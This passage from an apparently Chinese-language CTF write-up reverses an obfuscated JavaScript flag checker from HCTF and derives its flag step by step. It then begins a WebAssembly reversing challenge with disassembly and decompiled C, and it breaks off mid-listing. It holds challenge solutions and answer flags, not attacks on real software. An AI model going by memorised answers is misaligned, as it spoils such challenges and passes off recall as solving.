class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x3</span>) &amp; <span class="number">0x7f</span>) &gt;&gt; <span class="number">0x2</span>));</span><br><span class="line">                _0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x3</span>) &amp; <span class="number">0x3</span>) &lt;&lt; <span class="number">0x3</span> | _0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x4</span>) &gt;&gt; <span class="number">0x5</span>));</span><br><span class="line">                _0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)](_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x4</span>) &amp; <span class="number">0x1f</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> _0x545c12 = <span class="number">0x0</span>;</span><br><span class="line">            <span class="keyword">if</span> (_0x4ee491 == <span class="number">0x1</span>) _0x545c12 = <span class="number">0x6</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (_0x4ee491 == <span class="number">0x2</span>) _0x545c12 = <span class="number">0x4</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (_0x4ee491 == <span class="number">0x3</span>) _0x545c12 = <span class="number">0x3</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (_0x4ee491 == <span class="number">0x4</span>) _0x545c12 = <span class="number">0x1</span>;</span><br><span class="line">            <span class="keyword">for</span> (_0x1e1753 = <span class="number">0x0</span>; _0x1e1753 &lt; _0x545c12; _0x1e1753++) _0x4dc510[<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x2f&#x27;</span>)]();</span><br><span class="line">            <span class="keyword">for</span> (_0x1e1753 = <span class="number">0x0</span>; _0x1e1753 &lt; _0x545c12; _0x1e1753++) _0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* 启动 Debugger，干扰 console</span></span><br><span class="line"><span class="comment">            (function () &#123;</span></span><br><span class="line"><span class="comment">                (function _0x3c3bd8() &#123;</span></span><br><span class="line"><span class="comment">                    try &#123;</span></span><br><span class="line"><span class="comment">                        (function _0x4dc510(_0x460a91) &#123;</span></span><br><span class="line"><span class="comment">                            if ((&#x27;&#x27; + _0x460a91 / _0x460a91)[_0xa180(&#x27;0x30&#x27;)] !== 0x1 || _0x460a91 % 0x14 === 0x0) &#123;</span></span><br><span class="line"><span class="comment">                                (function () &#123;&#125;[&#x27;constructor&#x27;](&#x27;debugger&#x27;)());</span></span><br><span class="line"><span class="comment">                            &#125; else &#123;</span></span><br><span class="line"><span class="comment">                                debugger;</span></span><br><span class="line"><span class="comment">                            &#125;</span></span><br><span class="line"><span class="comment">                            _0x4dc510(++_0x460a91);</span></span><br><span class="line"><span class="comment">                        &#125;(0x0));</span></span><br><span class="line"><span class="comment">                    &#125; catch (_0x30f185) &#123;</span></span><br><span class="line"><span class="comment">                        setTimeout(_0x3c3bd8, 0x1388);</span></span><br><span class="line"><span class="comment">                    &#125;</span></span><br><span class="line"><span class="comment">                &#125;());</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">            &#125;());</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            <span class="keyword">return</span> _0x4dc510[<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x31&#x27;</span>)](<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将第三段 base32 编码，去除等号</span></span><br><span class="line">        a = <span class="title function_">b2c</span>(inputs[<span class="number">0x2</span>])[<span class="title function_">_0x43c8d1</span>(<span class="number">0xe</span>)](<span class="string">&#x27;=&#x27;</span>)[<span class="number">0x0</span>];</span><br><span class="line">        challenge2 = <span class="title function_">stringToHex</span>(a) ^ <span class="number">0x53a3f32</span>;  <span class="comment">// a = 0x53a3f32 ^ 0x4b7c0a73 = 0x4e463541 = &#x27;NF5A====&#x27; = &#x27;iz&#x27;</span></span><br><span class="line">        <span class="comment">// 第二个判断条件，确定第三段的字符为 iz</span></span><br><span class="line">        <span class="keyword">if</span> (challenge2 != <span class="number">0x4b7c0a73</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将第四段 base32 编码，去除等号</span></span><br><span class="line">        a = <span class="title function_">b2c</span>(inputs[<span class="number">0x3</span>])[<span class="title function_">_0x43c8d1</span>(<span class="number">0xe</span>)](<span class="string">&#x27;=&#x27;</span>)[<span class="number">0x0</span>];</span><br><span class="line">        challenge3 = <span class="title function_">stringToHex</span>(a) ^ challenge2;  <span class="comment">// a = 0x4b7c0a73 ^ 0x4315332 = &#x27;OMYA====&#x27; = &#x27;s0&#x27;</span></span><br><span class="line">        <span class="comment">// 第三个判断条件，确定第四段的字符为 s0</span></span><br><span class="line">        <span class="keyword">if</span> (challenge3 != <span class="number">0x4315332</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 0x4315332 * 0x4b7c0a73 * 第一段的长度</span></span><br><span class="line">        n = challenge3 * challenge2 * inputs[<span class="number">0x0</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)];</span><br><span class="line"></span><br><span class="line">        h = <span class="keyword">function</span> (<span class="params">seq, callback</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0x0</span>; i &lt; seq[<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)]; i++) &#123;</span><br><span class="line">                result += <span class="title function_">callback</span>(seq[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 第二段以“3”进行分割</span></span><br><span class="line">        j = inputs[<span class="number">0x1</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xe</span>)](<span class="string">&#x27;3&#x27;</span>);</span><br><span class="line">        <span class="comment">// 分割后的第一段和第二段长度相等</span></span><br><span class="line">        challenge4_1 = j[<span class="number">0x0</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)] != j[<span class="number">0x1</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)];</span><br><span class="line">        <span class="comment">// 异或以后等于 0x1613</span></span><br><span class="line">        challenge4_2 = (<span class="title function_">stringToHex</span>(j[<span class="number">0x0</span>]) ^ <span class="title function_">stringToHex</span>(j[<span class="number">0x1</span>])) != <span class="number">0x1613</span>;</span><br><span class="line">        <span class="comment">// 第四个判断条件</span></span><br><span class="line">        <span class="comment">// if (challenge4_1 || challenge4_2) &#123;</span></span><br><span class="line">        <span class="comment">//     return ![];</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// x.charCodeAt() * input[1].length</span></span><br><span class="line">        k = <span class="function"><span class="params">x</span> =&gt;</span> x[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)]() * inputs[<span class="number">0x1</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)];</span><br><span class="line">        <span class="comment">// 分割后的第一段每一个字符 * 第二段的长度，再加起来</span></span><br><span class="line">        challenge5 = <span class="title function_">h</span>(j[<span class="number">0x0</span>], k);</span><br><span class="line">        <span class="comment">// 第五个判断条件</span></span><br><span class="line">        <span class="keyword">if</span> (challenge5 != <span class="number">0x2f9b5072</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 确定 flag 一共有五段</span></span><br><span class="line">        <span class="comment">// 第五段的前四个字符 - 0x48a05362 == n % 0x2f9b5072</span></span><br><span class="line">        m = <span class="title function_">stringToHex</span>(inputs[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x0</span>, <span class="number">0x4</span>)) - <span class="number">0x48a05362</span> == n % challenge5;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">repreat</span>(<span class="params">char, count</span>) &#123;  <span class="comment">// char * count</span></span><br><span class="line">            <span class="keyword">var</span> result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0x0</span>; i &lt; count; i++) &#123;</span><br><span class="line">                result += char;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        challenge6_1 = !m;</span><br><span class="line">        <span class="comment">// 第五段第六个字符 * 2 ！= 第五段最后四个字符（除去了“&#125;”）</span></span><br><span class="line">        challenge6_2 = <span class="title function_">repreat</span>(inputs[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x5</span>, <span class="number">0x1</span>), <span class="number">0x2</span>) == inputs[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](-<span class="number">0x5</span>, <span class="number">0x4</span>);</span><br><span class="line">        <span class="comment">// 第五段的最后一个字符（除去了“&#125;”） - 第五段第五个字符 == 1</span></span><br><span class="line">        challenge6_3 = inputs[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](-<span class="number">0x2</span>, <span class="number">0x1</span>) - inputs[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x4</span>, <span class="number">0x1</span>) != <span class="number">0x1</span>;</span><br><span class="line">        <span class="comment">// 第六个判断条件</span></span><br><span class="line">        <span class="keyword">if</span> (challenge6_1 || challenge6_2 || challenge6_3) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        a = inputs[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x6</span>, <span class="number">0x2</span>)</span><br><span class="line">        b = inputs[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x6</span>, <span class="number">0x1</span>)</span><br><span class="line">        c = inputs[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)]</span><br><span class="line">        <span class="comment">// 第五段第七第八个字符的 hex == 第五段第七个字符 * 第五段的长度 * 5</span></span><br><span class="line">        o = <span class="title function_">stringToHex</span>(a)[<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x2</span>) == b[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)]() * c * <span class="number">0x5</span>;</span><br><span class="line">        challenge7_1 = o;</span><br><span class="line">        <span class="comment">// 第五段第五个字符 == &#x27;2&#x27;</span></span><br><span class="line">        <span class="comment">// 根据 challenge6_3 得出第五段最后一个字符为 3</span></span><br><span class="line">        challenge7_2 = inputs[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x4</span>, <span class="number">0x1</span>) == <span class="number">0x2</span>;</span><br><span class="line">        <span class="comment">// 第五段第七第八个字符 == 第五段第八个字符 * 2</span></span><br><span class="line">        challenge7_3 = a == <span class="title function_">repreat</span>(inputs[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x7</span>, <span class="number">0x1</span>), <span class="number">0x2</span>);</span><br><span class="line">        <span class="comment">// 最终的判断条件</span></span><br><span class="line">        <span class="keyword">return</span> challenge7_1 &amp;&amp; challenge7_2 &amp;&amp; challenge7_3;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">        <span class="variable language_">console</span>[<span class="string">&#x27;log&#x27;</span>](<span class="string">&#x27;gg&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> ![];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// var input = document[_0xa180(&#x27;0x32&#x27;)](_0xa180(&#x27;0x33&#x27;))[&#x27;value&#x27;];</span></span><br><span class="line">    <span class="comment">// 修改为从 query 获取 GET 参数方便调试</span></span><br><span class="line">    input = <span class="keyword">function</span>(<span class="params">name</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> r = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>.<span class="title function_">substr</span>(<span class="number">1</span>).<span class="title function_">match</span>(<span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="string">&quot;(^|&amp;)&quot;</span> + name + <span class="string">&quot;=([^&amp;]*)(&amp;|$)&quot;</span>));</span><br><span class="line">        <span class="keyword">if</span>(r != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">decodeURI</span>(r[<span class="number">2</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;(<span class="string">&#x27;input&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (input == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>[<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x34&#x27;</span>)](<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x35&#x27;</span>));</span><br><span class="line">        <span class="keyword">return</span> ![];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> result = <span class="title function_">check</span>(input);</span><br><span class="line">    <span class="keyword">if</span> (result) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x36&#x27;</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x37&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>[<span class="string">&#x27;onload&#x27;</span>] = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// window.console.clear();window.console.log(&#x27;Welcome to HCTF :&gt;&#x27;)</span></span><br><span class="line">    <span class="comment">//setInterval(_0xa180(&#x27;0x38&#x27;), 0x32); // 干扰 console</span></span><br><span class="line">    <span class="title function_">test</span>();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>主要的判断逻辑在 check 函数里，首先看到最后的 <code>inputs[0x4]</code> 可以确定输入一共有五段，以下划线“_”分割，并且已知以“hctf{”开头，以“}”结尾。推测<code>hctf&#123;xxxx_xxxx_xxxx_xxxx_xxxx&#125;</code></p><p>在 challenge1 处需要的条件是</p><ol><li>(第一段的最后两个字符的 hex ^ ‘{‘的 hex) % 第一段长度 == 5，可知第一段长度为 7</li></ol><p>在 challenge2 处需要的条件是</p><ol><li>第三段的 base32 除去等号的 hex ^ 0x53a3f32 == 0x4b7c0a73</li></ol><p>由此可以计算出第三段的 base32 除去等号的 hex 为 0x4e463541，转为 base32 为 NF5A====，解码为 iz，推测<code>hctf&#123;xx_xxxx_iz_xxxx_xxxx&#125;</code></p><p>在 challenge3 处需要的条件是</p><ol><li>第四段的 base32 除去等号的 hex ^ 0x4b7c0a73 == 0x4315332</li></ol><p>由此可以计算出第四段的 base32 除去等号的 hex 为 0x4f4d5941，转为 base32 为 OMYA====，解码为 s0，推测<code>hctf&#123;xx_xxxx_iz_s0_xxxx&#125;</code></p><p>在 challenge4 处需要的条件是</p><ol><li>第二段中必须包含一个’3’</li><li>第二段以’3’分割，前后的长度相等</li><li>前后 hex 异或得到的结果是 0x1613，</li></ol><p>由此得出第二段中间为 3，推测<code>hctf&#123;xx_xx3xx_iz_s0_xxxx&#125;</code></p><p>在 challenge5 处需要的条件是</p><ol><li>第二段分割以后的第一段，即’3’之前的每一个字符 * 第二段的长度，再加起来 == 0x2f9b5072</li></ol><p>假设第二段长度为 5，则 0x2f9b5072/5 除不尽，那么第二段长度为 7，得出第二段第一部分的和为 114108118，转为字符串为 rev</p><p>再根据 challenge4.3 得出第二段后面的字符串 hex 为 0x726576 ^ 0x1613=0x727365，转为字符串为 rse，推测<code>hctf&#123;xx_rev3rse_iz_s0_xxxx&#125;</code></p><p>在 challenge6 处需要的条件是</p><ol><li>第五段的前四个字符 hex - 0x48a05362 == (0x4315332 * 0x4b7c0a73 * 第一段的长度) % 0x2f9b5072</li><li>第五段第六个字符 + 第五段第六个字符 ！= 第五段除去’}’外最后五个字符，即 xxxx}中的 xxxx</li><li>第五段的倒数第二个字符 - 第五段第五个字符 == 1</li></ol><p>根据 challenge1 的结论以及 challenge6.1 可以算出第五段前四个字符的 hex 为 0x68347246，转为字符串为 h4rd，推测<code>hctf&#123;xx_rev3rse_iz_s0_h4rdxxxx&#125;</code></p><p>在 challenge7 处需要的条件是</p><ol><li>第五段第七和第八个字符的 hex 数字 == 第五段第七个字符 * 第五段的长度 * 5</li><li>第五段第五个字符 == ‘2’</li><li>第五段第七第八个字符 == 第五段第八个字符 + 第五段第吧个字符，即第五段第七和第八个字符相同</li></ol><p>根据 challenge7.2 可知，推测<code>hctf&#123;xx_rev3rse_iz_s0_h4rd2xxxxxxx&#125;</code></p><p>根据 challenge6.3 可知，推测<code>hctf&#123;xx_rev3rse_iz_s0_h4rd2xxxxxx3&#125;</code></p><p>根据附加条件 1：<code>flag.substr(-5,3)==&quot;333&quot;</code>，推测<code>hctf&#123;xx_rev3rse_iz_s0_h4rd2xxx3333&#125;</code></p><p>根据附加条件 2：<code>flag.substr(-8,1)==&quot;3&quot;</code>可知第五段长度为 8+5=13，并且第六个字符为’3’，推测<code>hctf&#123;xx_rev3rse_iz_s0_h4rd23xx3333&#125;</code></p><p>根据 challenge7.1 可以计算出第五段第七第八个字符的 hex 为 0x6565，转为字符串为 ee，推测<code>hctf&#123;xx_rev3rse_iz_s0_h4rd23ee3333&#125;</code></p><p>根据 challenge1 以及附加条件 4：<code>sha256(flag) == &quot;d3f154b641251e319855a73b010309a168a12927f3873c97d2e5163ea5cbb443&quot;</code></p><p>最终爆破出第一段最后两个字符为 j5，得到 flag 为：<code>hctf&#123;j5_rev3rse_iz_s0_h4rd23ee3333&#125;</code></p><h1 id="Baby-Reverse-200"><a href="#Baby-Reverse-200" class="headerlink" title="Baby Reverse(200)"></a>Baby Reverse(200)</h1><p>打开网页源码在 JavaScript 里对输入的字符串进行了处理</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> btnCheck = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;btnCheck&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> tbxFlag = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;flag&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> txtStatus = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;status&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// var _debug_asm;</span></span><br><span class="line"><span class="comment">// var _debug_mem;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">set_c_string</span>(<span class="params">buf, index, s</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; s.<span class="property">length</span>; i++)&#123;</span><br><span class="line">        buf[index + i] = s.<span class="title function_">charCodeAt</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    buf[index + i] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;flag.wasm&#x27;</span>)</span><br><span class="line">.<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">arrayBuffer</span>())</span><br><span class="line">.<span class="title function_">then</span>(<span class="title class_">WebAssembly</span>.<span class="property">instantiate</span>)</span><br><span class="line">.<span class="title function_">then</span>(<span class="function"><span class="params">mod</span> =&gt;</span> mod.<span class="property">instance</span>)</span><br><span class="line">.<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params">asm</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> mem = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(asm.<span class="property">exports</span>.<span class="property">memory</span>.<span class="property">buffer</span>);</span><br><span class="line">    <span class="comment">// _debug_mem = mem;</span></span><br><span class="line">    <span class="comment">// _debug_asm = asm;</span></span><br><span class="line"></span><br><span class="line">    btnCheck.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> flag = tbxFlag.<span class="property">value</span>;</span><br><span class="line">        <span class="comment">// console.log(flag);</span></span><br><span class="line">        <span class="keyword">var</span> buf_addr = asm.<span class="property">exports</span>.<span class="title function_">get_buf</span>();</span><br><span class="line">        <span class="title function_">set_c_string</span>(mem, buf_addr, flag);</span><br><span class="line">        <span class="keyword">if</span>(asm.<span class="property">exports</span>.<span class="title function_">check_flag</span>(buf_addr))&#123;</span><br><span class="line">            txtStatus.<span class="property">innerText</span> = (<span class="keyword">new</span> <span class="title class_">Date</span>()).<span class="title function_">toLocaleString</span>() + <span class="string">&#x27; * - * - * Correct flag! * - * - *&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            txtStatus.<span class="property">innerText</span> = (<span class="keyword">new</span> <span class="title class_">Date</span>()).<span class="title function_">toLocaleString</span>() + <span class="string">&#x27; Wrong flag&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;ready&#x27;</span>); </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>可以看到最后交给了 flag.wasm 处理，wasm 是 WebASsembly 的二进制格式文件，下载 flag.wasm 使用 wabt 进行逆向。首先将二进制格式的 flag.wasm 转换为文本格式 wat，懒得下载的可以使用 <a href="https://webassembly.github.io/wabt/demo/wasm2wat/"> 在线工具</a>。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">(module</span><br><span class="line">  (type $t0 (func (result i32)))</span><br><span class="line">  (type $t1 (func (param i32) (result i32)))</span><br><span class="line">  (func $get_buf (export &quot;get_buf&quot;) (type $t0) (result i32)</span><br><span class="line">    (i32.const 80))</span><br><span class="line">  (func $check_flag (export &quot;check_flag&quot;) (type $t1) (param $p0 i32) (result i32)</span><br><span class="line">    (local $l1 i32) (local $l2 i32)</span><br><span class="line">    (local.set $l1</span><br><span class="line">      (i32.const 0))</span><br><span class="line">    (local.set $l2</span><br><span class="line">      (i32.const 0))</span><br><span class="line">    (loop $L0</span><br><span class="line">      (local.set $l1</span><br><span class="line">        (i32.or</span><br><span class="line">          (i32.xor</span><br><span class="line">            (i32.shr_s</span><br><span class="line">              (i32.shl</span><br><span class="line">                (i32.xor</span><br><span class="line">                  (i32.load8_u</span><br><span class="line">                    (i32.add</span><br><span class="line">                      (local.get $p0)</span><br><span class="line">                      (local.get $l2)))</span><br><span class="line">                  (i32.load8_u</span><br><span class="line">                    (i32.add</span><br><span class="line">                      (local.get $l2)</span><br><span class="line">                      (i32.const 16))))</span><br><span class="line">                (i32.const 24))</span><br><span class="line">              (i32.const 24))</span><br><span class="line">            (i32.const 66))</span><br><span class="line">          (local.get $l1)))</span><br><span class="line">      (br_if $L0</span><br><span class="line">        (i32.ne</span><br><span class="line">          (local.tee $l2</span><br><span class="line">            (i32.add</span><br><span class="line">              (local.get $l2)</span><br><span class="line">              (i32.const 1)))</span><br><span class="line">          (i32.const 23))))</span><br><span class="line">    (i32.eqz</span><br><span class="line">      (local.get $l1)))</span><br><span class="line">  (table $T0 0 funcref)</span><br><span class="line">  (memory $memory (export &quot;memory&quot;) 1)</span><br><span class="line">  (data $d0 (i32.const 16) &quot;$.#%9\0a&#x27;..-\15&#x27; \0311&#x27;/ .;?B&quot;)</span><br><span class="line">  (data $d1 (i32.const 48) &quot;flag&#123;ThisFlagIsFake&#125;\00&quot;))</span><br></pre></td></tr></table></figure><p>直接看反汇编代码还是有点复杂，可以进一步将其反编译为 C 代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// flag.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> __FLAG_H_GENERATED_</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __FLAG_H_GENERATED_</span></span><br><span class="line"><span class="comment">/* Automically generated by wasm2c */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;wasm-rt.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> WASM_RT_MODULE_PREFIX</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 